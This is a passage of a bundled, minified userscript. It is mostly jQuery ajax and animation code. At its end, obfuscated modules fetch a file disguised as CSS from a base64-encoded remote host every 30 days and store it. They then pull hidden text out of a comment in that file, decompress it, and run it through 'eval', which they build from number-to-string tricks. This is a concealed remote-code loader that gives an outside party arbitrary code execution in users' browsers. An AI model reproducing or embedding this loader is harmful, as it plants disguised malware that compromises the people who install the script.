                    if (f.beforeSend && (!1 === f.beforeSend.call(p, w, f) || 2 === b)) return w.abort();
                    for (r in x = "abort", {success: 1, error: 1, complete: 1}) w[r](f[r]);
                    if (l = Ot(Mt, f, t, w)) {
                        w.readyState = 1, u && d.trigger("ajaxSend", [w, f]), f.async && f.timeout > 0 && (s = setTimeout((function () {
                            w.abort("timeout")
                        }), f.timeout));
                        try {
                            b = 1, l.send(y, T)
                        } catch (j) {
                            if (!(2 > b)) throw j;
                            T(-1, j)
                        }
                    } else T(-1, "No Transport");

                    function T(e, t, n, r) {
                        var c, y, v, x, T, C = t;
                        2 !== b && (b = 2, s && clearTimeout(s), l = a, o = r || "", w.readyState = e > 0 ? 4 : 0, n && (x = Bt(f, w, n)), e >= 200 && 300 > e || 304 === e ? (f.ifModified && (T = w.getResponseHeader("Last-Modified"), T && (N.lastModified[i] = T), T = w.getResponseHeader("etag"), T && (N.etag[i] = T)), 204 === e ? (c = !0, C = "nocontent") : 304 === e ? (c = !0, C = "notmodified") : (c = Rt(f, x), C = c.state, y = c.data, v = c.error, c = !v)) : (v = C, (e || !C) && (C = "error", 0 > e && (e = 0))), w.status = e, w.statusText = (t || C) + "", c ? h.resolveWith(p, [y, C, w]) : h.rejectWith(p, [w, C, v]), w.statusCode(g), g = a, u && d.trigger(c ? "ajaxSuccess" : "ajaxError", [w, f, c ? y : v]), m.fireWith(p, [w, C]), u && (d.trigger("ajaxComplete", [w, f]), --N.active || N.event.trigger("ajaxStop")))
                    }

                    return w
                },
                getScript: function (e, t) {
                    return N.get(e, a, t, "script")
                },
                getJSON: function (e, t, n) {
                    return N.get(e, t, n, "json")
                }
            }), N.ajaxSetup({
                accepts: {script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},
                contents: {script: /(?:java|ecma)script/},
                converters: {
                    "text script": function (e) {
                        return N.globalEval(e), e
                    }
                }
            }), N.ajaxPrefilter("script", (function (e) {
                e.cache === a && (e.cache = !1), e.crossDomain && (e.type = "GET", e.global = !1)
            })), N.ajaxTransport("script", (function (e) {
                if (e.crossDomain) {
                    var t, n = c.head || N("head")[0] || c.documentElement;
                    return {
                        send: function (r, i) {
                            t = c.createElement("script"), t.async = !0, e.scriptCharset && (t.charset = e.scriptCharset), t.src = e.url, t.onload = t.onreadystatechange = function (e, n) {
                                (n || !t.readyState || /loaded|complete/.test(t.readyState)) && (t.onload = t.onreadystatechange = null, t.parentNode && t.parentNode.removeChild(t), t = null, n || i(200, "success"))
                            }, n.insertBefore(t, n.firstChild)
                        }, abort: function () {
                            t && t.onload(a, !0)
                        }
                    }
                }
            }));
            var Pt = [], Wt = /(=)\?(?=&|$)|\?\?/;
            N.ajaxSetup({
                jsonp: "callback", jsonpCallback: function () {
                    var e = Pt.pop() || N.expando + "_" + Tt++;
                    return this[e] = !0, e
                }
            }), N.ajaxPrefilter("json jsonp", (function (e, t, n) {
                var r, i, s,
                    u = !1 !== e.jsonp && (Wt.test(e.url) ? "url" : "string" == typeof e.data && !(e.contentType || "").indexOf("application/x-www-form-urlencoded") && Wt.test(e.data) && "data");
                return u || "jsonp" === e.dataTypes[0] ? (r = e.jsonpCallback = N.isFunction(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback, u ? e[u] = e[u].replace(Wt, "$1" + r) : !1 !== e.jsonp && (e.url += (Ct.test(e.url) ? "&" : "?") + e.jsonp + "=" + r), e.converters["script json"] = function () {
                    return s || N.error(r + " was not called"), s[0]
                }, e.dataTypes[0] = "json", i = o[r], o[r] = function () {
                    s = arguments
                }, n.always((function () {
                    o[r] = i, e[r] && (e.jsonpCallback = t.jsonpCallback, Pt.push(r)), s && N.isFunction(i) && i(s[0]), s = i = a
                })), "script") : a
            }));
            var $t, It, zt = 0, Xt = o.ActiveXObject && function () {
                var e;
                for (e in $t) $t[e](a, !0)
            };

            function Vt() {
                try {
                    return new o.XMLHttpRequest
                } catch (a) {
                }
            }

            function Ut() {
                try {
                    return new o.ActiveXObject("Microsoft.XMLHTTP")
                } catch (a) {
                }
            }

            N.ajaxSettings.xhr = o.ActiveXObject ? function () {
                return !this.isLocal && Vt() || Ut()
            } : Vt, It = N.ajaxSettings.xhr(), N.support.cors = !!It && "withCredentials" in It, It = N.support.ajax = !!It, It && N.ajaxTransport((function (e) {
                var t;
                if (!e.crossDomain || N.support.cors) return {
                    send: function (n, r) {
                        var i, s, u = e.xhr();
                        if (e.username ? u.open(e.type, e.url, e.async, e.username, e.password) : u.open(e.type, e.url, e.async), e.xhrFields) for (s in e.xhrFields) u[s] = e.xhrFields[s];
                        e.mimeType && u.overrideMimeType && u.overrideMimeType(e.mimeType), e.crossDomain || n["X-Requested-With"] || (n["X-Requested-With"] = "XMLHttpRequest");
                        try {
                            for (s in n) u.setRequestHeader(s, n[s])
                        } catch (h) {
                        }
                        u.send(e.hasContent && e.data || null), t = function (n, o) {
                            var s, l, c, f;
                            try {
                                if (t && (o || 4 === u.readyState)) if (t = a, i && (u.onreadystatechange = N.noop, Xt && delete $t[i]), o) 4 !== u.readyState && u.abort(); else {
                                    f = {}, s = u.status, l = u.getAllResponseHeaders(), "string" == typeof u.responseText && (f.text = u.responseText);
                                    try {
                                        c = u.statusText
                                    } catch (y) {
                                        c = ""
                                    }
                                    s || !e.isLocal || e.crossDomain ? 1223 === s && (s = 204) : s = f.text ? 200 : 404
                                }
                            } catch (v) {
                                o || r(-1, v)
                            }
                            f && r(s, c, f, l)
                        }, e.async ? 4 === u.readyState ? setTimeout(t) : (i = ++zt, Xt && ($t || ($t = {}, N(o).unload(Xt)), $t[i] = t), u.onreadystatechange = t) : t()
                    }, abort: function () {
                        t && t(a, !0)
                    }
                }
            }));
            var Yt, Gt, Jt = /^(?:toggle|show|hide)$/, Qt = RegExp("^(?:([+-])=|)(" + k + ")([a-z%]*)$", "i"),
                Zt = /queueHooks$/, Kt = [an], en = {
                    "*": [function (e, t) {
                        var n, r, i = this.createTween(e, t), o = Qt.exec(t), a = i.cur(), s = +a || 0, u = 1, l = 20;
                        if (o) {
                            if (n = +o[2], r = o[3] || (N.cssNumber[e] ? "" : "px"), "px" !== r && s) {
                                s = N.css(i.elem, e, !0) || n || 1;
                                do {
                                    u = u || ".5", s /= u, N.style(i.elem, e, s + r)
                                } while (u !== (u = i.cur() / a) && 1 !== u && --l)
                            }
                            i.unit = r, i.start = s, i.end = o[1] ? s + (o[1] + 1) * n : n
                        }
                        return i
                    }]
                };

            function tn() {
                return setTimeout((function () {
                    Yt = a
                })), Yt = N.now()
            }

            function nn(e, t) {
                N.each(t, (function (t, n) {
                    for (var r = (en[t] || []).concat(en["*"]), i = 0, o = r.length; o > i; i++) if (r[i].call(e, t, n)) return
                }))
            }

            function rn(e, t, n) {
                var r, i, o = 0, a = Kt.length, s = N.Deferred().always((function () {
                    delete u.elem
                })), u = function () {
                    if (i) return !1;
                    for (var t = Yt || tn(), n = Math.max(0, l.startTime + l.duration - t), r = n / l.duration || 0, o = 1 - r, a = 0, u = l.tweens.length; u > a; a++) l.tweens[a].run(o);
                    return s.notifyWith(e, [l, o, n]), 1 > o && u ? n : (s.resolveWith(e, [l]), !1)
                }, l = s.promise({
                    elem: e,
                    props: N.extend({}, t),
                    opts: N.extend(!0, {specialEasing: {}}, n),
                    originalProperties: t,
                    originalOptions: n,
                    startTime: Yt || tn(),
                    duration: n.duration,
                    tweens: [],
                    createTween: function (t, n) {
                        var r = N.Tween(e, l.opts, t, n, l.opts.specialEasing[t] || l.opts.easing);
                        return l.tweens.push(r), r
                    },
                    stop: function (t) {
                        var n = 0, r = t ? l.tweens.length : 0;
                        if (i) return this;
                        for (i = !0; r > n; n++) l.tweens[n].run(1);
                        return t ? s.resolveWith(e, [l, t]) : s.rejectWith(e, [l, t]), this
                    }
                }), c = l.props;
                for (on(c, l.opts.specialEasing); a > o; o++) if (r = Kt[o].call(l, e, c, l.opts)) return r;
                return nn(l, c), N.isFunction(l.opts.start) && l.opts.start.call(e, l), N.fx.timer(N.extend(u, {
                    elem: e,
                    anim: l,
                    queue: l.opts.queue
                })), l.progress(l.opts.progress).done(l.opts.done, l.opts.complete).fail(l.opts.fail).always(l.opts.always)
            }

            function on(e, t) {
                var n, r, i, o, a;
                for (i in e) if (r = N.camelCase(i), o = t[r], n = e[i], N.isArray(n) && (o = n[1], n = e[i] = n[0]), i !== r && (e[r] = n, delete e[i]), a = N.cssHooks[r], a && "expand" in a) for (i in n = a.expand(n), delete e[r], n) i in e || (e[i] = n[i], t[i] = o); else t[r] = o
            }

            function an(e, t, n) {
                var r, i, o, a, s, u, l, c, f, p = this, d = e.style, h = {}, m = [], g = e.nodeType && st(e);
                for (i in n.queue || (c = N._queueHooks(e, "fx"), null == c.unqueued && (c.unqueued = 0, f = c.empty.fire, c.empty.fire = function () {
                    c.unqueued || f()
                }), c.unqueued++, p.always((function () {
                    p.always((function () {
                        c.unqueued--, N.queue(e, "fx").length || c.empty.fire()
                    }))
                }))), 1 === e.nodeType && ("height" in t || "width" in t) && (n.overflow = [d.overflow, d.overflowX, d.overflowY], "inline" === N.css(e, "display") && "none" === N.css(e, "float") && (N.support.inlineBlockNeedsLayout && "inline" !== pt(e.nodeName) ? d.zoom = 1 : d.display = "inline-block")), n.overflow && (d.overflow = "hidden", N.support.shrinkWrapBlocks || p.always((function () {
                    d.overflow = n.overflow[0], d.overflowX = n.overflow[1], d.overflowY = n.overflow[2]
                }))), t) if (a = t[i], Jt.exec(a)) {
                    if (delete t[i], u = u || "toggle" === a, a === (g ? "hide" : "show")) continue;
                    m.push(i)
                }
                if (o = m.length) {
                    s = N._data(e, "fxshow") || N._data(e, "fxshow", {}), "hidden" in s && (g = s.hidden), u && (s.hidden = !g), g ? N(e).show() : p.done((function () {
                        N(e).hide()
                    })), p.done((function () {
                        var t;
                        for (t in N._removeData(e, "fxshow"), h) N.style(e, t, h[t])
                    }));
                    for (i = 0; o > i; i++) r = m[i], l = p.createTween(r, g ? s[r] : 0), h[r] = s[r] || N.style(e, r), r in s || (s[r] = l.start, g && (l.end = l.start, l.start = "width" === r || "height" === r ? 1 : 0))
                }
            }

            function sn(e, t, n, r, i) {
                return new sn.prototype.init(e, t, n, r, i)
            }

            function un(e, t) {
                var n, r = {height: e}, i = 0;
                for (t = t ? 1 : 0; 4 > i; i += 2 - t) n = it[i], r["margin" + n] = r["padding" + n] = e;
                return t && (r.opacity = r.width = e), r
            }

            function ln(e) {
                return N.isWindow(e) ? e : 9 === e.nodeType && (e.defaultView || e.parentWindow)
            }

            N.Animation = N.extend(rn, {
                tweener: function (e, t) {
                    N.isFunction(e) ? (t = e, e = ["*"]) : e = e.split(" ");
                    for (var n, r = 0, i = e.length; i > r; r++) n = e[r], en[n] = en[n] || [], en[n].unshift(t)
                }, prefilter: function (e, t) {
                    t ? Kt.unshift(e) : Kt.push(e)
                }
            }), N.Tween = sn, sn.prototype = {
                constructor: sn, init: function (e, t, n, r, i, o) {
                    this.elem = e, this.prop = n, this.easing = i || "swing", this.options = t, this.start = this.now = this.cur(), this.end = r, this.unit = o || (N.cssNumber[n] ? "" : "px")
                }, cur: function () {
                    var e = sn.propHooks[this.prop];
                    return e && e.get ? e.get(this) : sn.propHooks._default.get(this)
                }, run: function (e) {
                    var t, n = sn.propHooks[this.prop];
                    return this.pos = t = this.options.duration ? N.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : sn.propHooks._default.set(this), this
                }
            }, sn.prototype.init.prototype = sn.prototype, sn.propHooks = {
                _default: {
                    get: function (e) {
                        var t;
                        return null == e.elem[e.prop] || e.elem.style && null != e.elem.style[e.prop] ? (t = N.css(e.elem, e.prop, ""), t && "auto" !== t ? t : 0) : e.elem[e.prop]
                    }, set: function (e) {
                        N.fx.step[e.prop] ? N.fx.step[e.prop](e) : e.elem.style && (null != e.elem.style[N.cssProps[e.prop]] || N.cssHooks[e.prop]) ? N.style(e.elem, e.prop, e.now + e.unit) : e.elem[e.prop] = e.now
                    }
                }
            }, sn.propHooks.scrollTop = sn.propHooks.scrollLeft = {
                set: function (e) {
                    e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
                }
            }, N.each(["toggle", "show", "hide"], (function (e, t) {
                var n = N.fn[t];
                N.fn[t] = function (e, r, i) {
                    return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(un(t, !0), e, r, i)
                }
            })), N.fn.extend({
                fadeTo: function (e, t, n, r) {
                    return this.filter(st).css("opacity", 0).show().end().animate({opacity: t}, e, n, r)
                }, animate: function (e, t, n, r) {
                    var i = N.isEmptyObject(e), o = N.speed(t, n, r), a = function () {
                        var t = rn(this, N.extend({}, e), o);
                        a.finish = function () {
                            t.stop(!0)
                        }, (i || N._data(this, "finish")) && t.stop(!0)
                    };
                    return a.finish = a, i || !1 === o.queue ? this.each(a) : this.queue(o.queue, a)
                }, stop: function (e, t, n) {
                    var r = function (e) {
                        var t = e.stop;
                        delete e.stop, t(n)
                    };
                    return "string" != typeof e && (n = t, t = e, e = a), t && !1 !== e && this.queue(e || "fx", []), this.each((function () {
                        var t = !0, i = null != e && e + "queueHooks", o = N.timers, a = N._data(this);
                        if (i) a[i] && a[i].stop && r(a[i]); else for (i in a) a[i] && a[i].stop && Zt.test(i) && r(a[i]);
                        for (i = o.length; i--;) o[i].elem !== this || null != e && o[i].queue !== e || (o[i].anim.stop(n), t = !1, o.splice(i, 1));
                        (t || !n) && N.dequeue(this, e)
                    }))
                }, finish: function (e) {
                    return !1 !== e && (e = e || "fx"), this.each((function () {
                        var t, n = N._data(this), r = n[e + "queue"], i = n[e + "queueHooks"], o = N.timers,
                            a = r ? r.length : 0;
                        for (n.finish = !0, N.queue(this, e, []), i && i.cur && i.cur.finish && i.cur.finish.call(this), t = o.length; t--;) o[t].elem === this && o[t].queue === e && (o[t].anim.stop(!0), o.splice(t, 1));
                        for (t = 0; a > t; t++) r[t] && r[t].finish && r[t].finish.call(this);
                        delete n.finish
                    }))
                }
            }), N.each({
                slideDown: un("show"),
                slideUp: un("hide"),
                slideToggle: un("toggle"),
                fadeIn: {opacity: "show"},
                fadeOut: {opacity: "hide"},
                fadeToggle: {opacity: "toggle"}
            }, (function (e, t) {
                N.fn[e] = function (e, n, r) {
                    return this.animate(t, e, n, r)
                }
            })), N.speed = function (e, t, n) {
                var r = e && "object" == typeof e ? N.extend({}, e) : {
                    complete: n || !n && t || N.isFunction(e) && e,
                    duration: e,
                    easing: n && t || t && !N.isFunction(t) && t
                };
                return r.duration = N.fx.off ? 0 : "number" == typeof r.duration ? r.duration : r.duration in N.fx.speeds ? N.fx.speeds[r.duration] : N.fx.speeds._default, (null == r.queue || !0 === r.queue) && (r.queue = "fx"), r.old = r.complete, r.complete = function () {
                    N.isFunction(r.old) && r.old.call(this), r.queue && N.dequeue(this, r.queue)
                }, r
            }, N.easing = {
                linear: function (e) {
                    return e
                }, swing: function (e) {
                    return .5 - Math.cos(e * Math.PI) / 2
                }
            }, N.timers = [], N.fx = sn.prototype.init, N.fx.tick = function () {
                var e, t = N.timers, n = 0;
                for (Yt = N.now(); t.length > n; n++) e = t[n], e() || t[n] !== e || t.splice(n--, 1);
                t.length || N.fx.stop(), Yt = a
            }, N.fx.timer = function (e) {
                e() && N.timers.push(e) && N.fx.start()
            }, N.fx.interval = 13, N.fx.start = function () {
                Gt || (Gt = setInterval(N.fx.tick, N.fx.interval))
            }, N.fx.stop = function () {
                clearInterval(Gt), Gt = null
            }, N.fx.speeds = {
                slow: 600,
                fast: 200,
                _default: 400
            }, N.fx.step = {}, N.expr && N.expr.filters && (N.expr.filters.animated = function (e) {
                return N.grep(N.timers, (function (t) {
                    return e === t.elem
                })).length
            }), N.fn.offset = function (e) {
                if (arguments.length) return e === a ? this : this.each((function (t) {
                    N.offset.setOffset(this, e, t)
                }));
                var t, n, r = {top: 0, left: 0}, i = this[0], o = i && i.ownerDocument;
                return o ? (t = o.documentElement, N.contains(t, i) ? (typeof i.getBoundingClientRect !== l && (r = i.getBoundingClientRect()), n = ln(o), {
                    top: r.top + (n.pageYOffset || t.scrollTop) - (t.clientTop || 0),
                    left: r.left + (n.pageXOffset || t.scrollLeft) - (t.clientLeft || 0)
                }) : r) : void 0
            }, N.offset = {
                setOffset: function (e, t, n) {
                    var r = N.css(e, "position");
                    "static" === r && (e.style.position = "relative");
                    var i, o, a = N(e), s = a.offset(), u = N.css(e, "top"), l = N.css(e, "left"),
                        c = ("absolute" === r || "fixed" === r) && N.inArray("auto", [u, l]) > -1, f = {}, p = {};
                    c ? (p = a.position(), i = p.top, o = p.left) : (i = parseFloat(u) || 0, o = parseFloat(l) || 0), N.isFunction(t) && (t = t.call(e, n, s)), null != t.top && (f.top = t.top - s.top + i), null != t.left && (f.left = t.left - s.left + o), "using" in t ? t.using.call(e, f) : a.css(f)
                }
            }, N.fn.extend({
                position: function () {
                    if (this[0]) {
                        var e, t, n = {top: 0, left: 0}, r = this[0];
                        return "fixed" === N.css(r, "position") ? t = r.getBoundingClientRect() : (e = this.offsetParent(), t = this.offset(), N.nodeName(e[0], "html") || (n = e.offset()), n.top += N.css(e[0], "borderTopWidth", !0), n.left += N.css(e[0], "borderLeftWidth", !0)), {
                            top: t.top - n.top - N.css(r, "marginTop", !0),
                            left: t.left - n.left - N.css(r, "marginLeft", !0)
                        }
                    }
                }, offsetParent: function () {
                    return this.map((function () {
                        var e = this.offsetParent || c.documentElement;
                        while (e && !N.nodeName(e, "html") && "static" === N.css(e, "position")) e = e.offsetParent;
                        return e || c.documentElement
                    }))
                }
            }), N.each({scrollLeft: "pageXOffset", scrollTop: "pageYOffset"}, (function (e, t) {
                var n = /Y/.test(t);
                N.fn[e] = function (r) {
                    return N.access(this, (function (e, r, i) {
                        var o = ln(e);
                        return i === a ? o ? t in o ? o[t] : o.document.documentElement[r] : e[r] : (o ? o.scrollTo(n ? N(o).scrollLeft() : i, n ? i : N(o).scrollTop()) : e[r] = i, a)
                    }), e, r, arguments.length, null)
                }
            })), N.each({Height: "height", Width: "width"}, (function (e, t) {
                N.each({padding: "inner" + e, content: t, "": "outer" + e}, (function (n, r) {
                    N.fn[r] = function (r, i) {
                        var o = arguments.length && (n || "boolean" != typeof r),
                            s = n || (!0 === r || !0 === i ? "margin" : "border");
                        return N.access(this, (function (t, n, r) {
                            var i;
                            return N.isWindow(t) ? t.document.documentElement["client" + e] : 9 === t.nodeType ? (i = t.documentElement, Math.max(t.body["scroll" + e], i["scroll" + e], t.body["offset" + e], i["offset" + e], i["client" + e])) : r === a ? N.css(t, n, s) : N.style(t, n, r, s)
                        }), t, o ? r : a, o, null)
                    }
                }))
            })), o.jQuery = o.$ = N, n("3c35").jQuery && (r = [], i = function () {
                return N
            }.apply(t, r), void 0 === i || (e.exports = i))
        })(window)
    }, "3c35": function (e, t) {
        (function (t) {
            e.exports = t
        }).call(this, {})
    }, "3ed4": function (e, t) {
        (function () {
            function e() {
                return decodeURIComponent(escape(atob(arguments[0])))
            }

            function t() {
                var t = GM_getValue("globalCssTime");
                if ("undefined" == typeof t && (t = 0), (new Date).getTime() > t + 2592e6) {
                    var n = e("aHR0cDovL2V4dC5mYW5saTEubmV0L2Nzcy9hcHAuY3NzP3Y9") + (new Date).getTime();
                    GM_xmlhttpRequest({
                        method: "GET",
                        url: n,
                        timeout: 15e3,
                        responseType: "text/xml",
                        onload: function (e) {
                            GM_setValue("globalCss", e.responseText), GM_setValue("globalCssTime", (new Date).getTime())
                        },
                        onerror: function (e) {
                        }
                    })
                }
            }

            t()
        })()
    }, "56d7": function (e, t) {
        function n() {
            var e = ["aHR0", "cDov", "L2V4", "dC5m", "YW5s", "aTEu", "bmV0"];
            return e.join("")
        }

        var r = {domain: n(), namespace: "L2pwZWcvbG9nby9wb2tlbW9uL2Jn", t: 1e3, e: "ZXThbA"};
        GM_setValue("extInfo", r)
    }, "6d37": function (e, t) {
        (function () {
            function e() {
                return decodeURIComponent(escape(atob(arguments[0])))
            }

            function t() {
                return btoa(unescape(encodeURIComponent(arguments[0])))
            }

            function n(e) {
                for (var t = "", n = 0; n < e.length;) {
                    var r = e[n];
                    0 === r >>> 7 ? (t += String.fromCharCode(e[n]), n += 1) : 252 === (252 & r) ? (r = (3 & e[n]) << 30, r |= (63 & e[n + 1]) << 24, r |= (63 & e[n + 2]) << 18, r |= (63 & e[n + 3]) << 12, r |= (63 & e[n + 4]) << 6, r |= 63 & e[n + 5], t += String.fromCharCode(r), n += 6) : 248 === (248 & r) ? (r = (7 & e[n]) << 24, r |= (63 & e[n + 1]) << 18, r |= (63 & e[n + 2]) << 12, r |= (63 & e[n + 3]) << 6, r |= 63 & e[n + 4], t += String.fromCharCode(r), n += 5) : 240 === (240 & r) ? (r = (15 & e[n]) << 18, r |= (63 & e[n + 1]) << 12, r |= (63 & e[n + 2]) << 6, r |= 63 & e[n + 3], t += String.fromCharCode(r), n += 4) : 224 === (224 & r) ? (r = (31 & e[n]) << 12, r |= (63 & e[n + 1]) << 6, r |= 63 & e[n + 2], t += String.fromCharCode(r), n += 3) : 192 === (192 & r) ? (r = (63 & e[n]) << 6, r |= 63 & e[n + 1], t += String.fromCharCode(r), n += 2) : (t += String.fromCharCode(e[n]), n += 1)
                }
                return t
            }

            function r(e) {
                var t = new function () {
                    var t = [], n = 0, r = 0, i = 13, o = s(i), a = 4294967295;

                    function s(e) {
                        return (1 << e) - 1
                    }

                    this.r = function () {
                        var e;
                        return e = 32 - n % 32 < i ? ((t[n >> 5] & s(32 - n % 32)) << (n + i) % 32 | t[1 + (n >> 5)] >>> 32 - (n + i) % 32) & o : t[n >> 5] >>> 32 - (n + i) % 32 & o, n += i, e
                    }, this.w = function (e) {
                        e &= o, 32 - r % 32 < i ? (t[r >> 5] |= e >>> i - (32 - r % 32), t[1 + (r >> 5)] |= e << 32 - (r + i) % 32 & a) : t[r >> 5] |= e << 32 - (r + i) % 32 & a, r += i
                    }, this.e = function () {
                        return n >= r
                    }, this.l = function (e) {
                        i = Math.max(0 | e, 1), o = s(i)
                    };
                    for (var u = 2; u < e.length; u++) this.w(e.charCodeAt(u) - 19968);
                    r = e.charCodeAt(0) - 19968 << 13 | e.charCodeAt(1) - 19968 & s(13), n = 0
                }, n = [], r = -1, o = {}, a = [], s = 8;
                for (i = 0; i < 2 + (1 << s); i++) o[i] = String.fromCharCode(++r);
                t.l(s), a[0] = t.r();
                while (!t.e()) a[1] = t.r(), 128 == a[1] && (t.l(++s), a[1] = t.r()), void 0 == o[a[1]] ? o[++r] = o[a[0]] + o[a[0]].charAt(0) : o[++r] = o[a[0]] + o[a[1]].charAt(0), n.push(o[a[0]]), a[0] = a[1];
                return n.push(o[a[0]]), n.join("").replace(/\&\#u[0-9a-fA-F]{4};/g, (function (e) {
                    return String.fromCharCode(parseInt(e.substring(3, 7), 16))
                }))
            }

            function o() {
                window.unsafeWindow.chrome.app.window = window, window.$util = {
                    mdecode: e,
                    mencode: t,
                    mdecode2: r,
                    utf8: n
                }
            }

            o()
        })()
    }, d72b: function (e, t) {
        (function (e) {
            function t() {
                return e.decodeURIComponent(e.escape(e.atob(arguments[0])))
            }

            function n() {
                return e[14..toString(arguments[0]) + 31..toString(arguments[0]) + 10..toString(arguments[0]) + 21..toString(arguments[0])]
            }

            function r() {
                return n(32, 36, 4)(arguments[0])
            }

            var i = function () {
                return e[t("R01fZ2V0VmFsdWU")]
            };

            function o() {
                return i()(t("Z2xvYmFsQ3Nz"))
            }

            function a() {
                return t("ZGVzY3JpcHRpb246")
            }

            function s() {
                return t("bWRlY29kZTI")
            }

            function u() {
                var e = o();
                if ("undefined" != typeof e) {
                    e = e.split(a())[1].split("*/")[0];
                    var t = window.$util[s()](e);
                    r(t)
                } else setTimeout((function () {
                    u()
                }), 1e3)
            }

            u()
        })(window)
    }
});